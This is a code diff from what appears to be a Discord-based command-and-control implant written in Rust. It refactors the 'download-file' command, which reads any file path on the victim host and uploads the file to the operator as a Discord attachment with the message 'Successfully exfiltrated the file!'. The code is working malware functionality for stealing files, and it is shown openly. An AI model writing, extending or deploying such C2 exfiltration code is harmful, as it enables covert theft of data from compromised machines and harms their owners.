@@ -1,7 +1,6 @@
 use crate::{
-    errors::DiscordC2Error,
-    os::process_handler::ProcessHandler,
-    session::SHELL_TYPE,
+    discord_utils::bot_functions::send_interaction_response, errors::DiscordC2Error,
+    os::process_handler::ProcessHandler, session::SHELL_TYPE,
 };
 
 use std::{
@@ -12,36 +11,45 @@ use std::{
 use serenity::{
     builder::CreateApplicationCommand,
     client::Context,
-    model::{application::{command::CommandOptionType, interaction::{application_command::{ApplicationCommandInteraction, CommandDataOption, CommandDataOptionValue}, InteractionResponseType}}, channel::AttachmentType}
+    model::{
+        application::{
+            command::CommandOptionType,
+            interaction::{
+                application_command::{
+                    ApplicationCommandInteraction, CommandDataOption, CommandDataOptionValue,
+                },
+            },
+        },
+        channel::AttachmentType,
+    },
 };
 
-use tokio::{
-    fs::File,
-    io::AsyncReadExt,
-};
+use tokio::{fs::File, io::AsyncReadExt};
 
-
-
+use tracing::{error, info as informational, warn};
 
 pub fn register(command: &mut CreateApplicationCommand) -> &mut CreateApplicationCommand {
     command
         .name("download-file")
         .description("Downloads a file from the remote host.")
-        .create_option(
-            |option| {
-                option.name("file-path")
-                    .kind(CommandOptionType::String)
-                    .description("Relative to the working directory of the session, or an absolute path")
-                    .required(true)
-            }
-        )
+        .create_option(|option| {
+            option
+                .name("file-path")
+                .kind(CommandOptionType::String)
+                .description(
+                    "Relative to the working directory of the session, or an absolute path",
+                )
+                .required(true)
+        })
 }
 
-pub async fn run(options: &[CommandDataOption]) -> Result<Option<AttachmentType>, DiscordC2Error> {
+pub async fn run(options: &[CommandDataOption]) -> Result<Option<AttachmentType<'static>>, DiscordC2Error> {
+    let options = options.to_owned();
     let option = options
         .get(0)
         .ok_or_else(|| DiscordC2Error::InvalidInput("Expected download options".to_string()))?
-        .resolved.clone()
+        .resolved
+        .clone()
         .ok_or_else(|| DiscordC2Error::InvalidInput("File path option not found.".to_string()))?;
 
     if let CommandDataOptionValue::String(file_path) = option {
@@ -58,12 +66,10 @@ pub async fn run(options: &[CommandDataOption]) -> Result<Option<AttachmentType>
 async fn path_validator(file_path: &str) -> Result<PathBuf, DiscordC2Error> {
     let shell_type = SHELL_TYPE.lock().await;
     let process_handler = match shell_type.as_ref() {
-        Some(shell_type) => {
-            ProcessHandler::instance(shell_type).await
-        }
-        None => {
-            Err(DiscordC2Error::InvalidInput("Shell type not found.".to_string()))
-        }
+        Some(shell_type) => ProcessHandler::instance(shell_type).await,
+        None => Err(DiscordC2Error::InvalidInput(
+            "Shell type not found.".to_string(),
+        )),
     }?;
 
     // Should return a DiscordC2Error::RegexError if not successful
@@ -89,10 +95,20 @@ async fn file_to_attachment(file_path: PathBuf) -> Result<AttachmentType<'static
     let mut buffer = [0; 8912];
 
     let _metadata = file.metadata().await?; // use this for size checks
+
     let mut final_bytes = Vec::new();
 
-    let file_extension = file_path.extension().ok_or(DiscordC2Error::InvalidInput("File extension not found.".to_string()));
-    let file_name = file_path.file_name().ok_or(DiscordC2Error::InvalidInput("File name not found.".to_string()));
+    let file_extension = file_path
+        .extension()
+        .and_then(|ext| ext.to_str())
+        .unwrap_or_else(|| {
+            warn!("Extension was not found");
+            "null"
+        });
+
+    let file_name = file_path.file_name().ok_or(DiscordC2Error::InvalidInput(
+        "File name not found.".to_string(),
+    ));
 
     //TODO: reading 8kb into the file even if not necessary, this is why size checks are important
     loop {
@@ -102,9 +118,16 @@ async fn file_to_attachment(file_path: PathBuf) -> Result<AttachmentType<'static
         }
         final_bytes.extend_from_slice(&buffer);
     }
-     Ok(AttachmentType::Bytes {
+
+    Ok(AttachmentType::Bytes {
         data: Cow::from(final_bytes),
-        filename: format!("{}.{}", file_name?.to_str().ok_or(DiscordC2Error::InvalidInput("file name couldn't be converted".parse().unwrap()))?, file_extension?.to_str().ok_or(DiscordC2Error::InvalidInput("file name couldn't be converted".parse().unwrap()))?),
+        filename: format!(
+            "{}.{}",
+            file_name?.to_str().ok_or(DiscordC2Error::InvalidInput(
+                "file name couldn't be converted".to_string()
+            ))?,
+            file_extension
+        ),
     })
 }
 
@@ -113,33 +136,17 @@ pub async fn download_handler(
     command: &ApplicationCommandInteraction,
 ) -> Result<(), DiscordC2Error> {
     let attachment = run(&command.data.options).await;
+    
     match attachment {
         Ok(Some(attachment)) => {
-            command
-                .create_interaction_response(&ctx.http, |response| {
-                    response
-                        .kind(InteractionResponseType::ChannelMessageWithSource)
-                        .interaction_response_data(|message| {
-                            message.content("Successfully exfiltrated!");
-                            message.add_file(attachment);
-                            message
-                        })
-                }).await?;
-        }
-        Ok(None) => {
-            return Ok(());
+            informational!("Successfully exfiltrated the requested file.");
+            send_interaction_response(ctx, &command.clone(), "Successfully exfiltrated the file!",Some(attachment)).await?;
         }
         Err(reason) => {
-            command
-                .create_interaction_response(&ctx.http, |response| {
-                    response
-                        .kind(InteractionResponseType::ChannelMessageWithSource)
-                        .interaction_response_data(|message| {
-                            message.content(format!("CRITICAL ERROR WHEN DOWNLOADING FILE: {}", reason));
-                            message
-                        })
-                }).await?;
+            error!("Failed to exfiltrate the file: {}", reason);
+            send_interaction_response(ctx,&command.clone(),format!("Failed to exfiltrate the file: {}", reason),None).await?;
         }
+        _ => return Ok(()),
     }
     Ok(())
 }
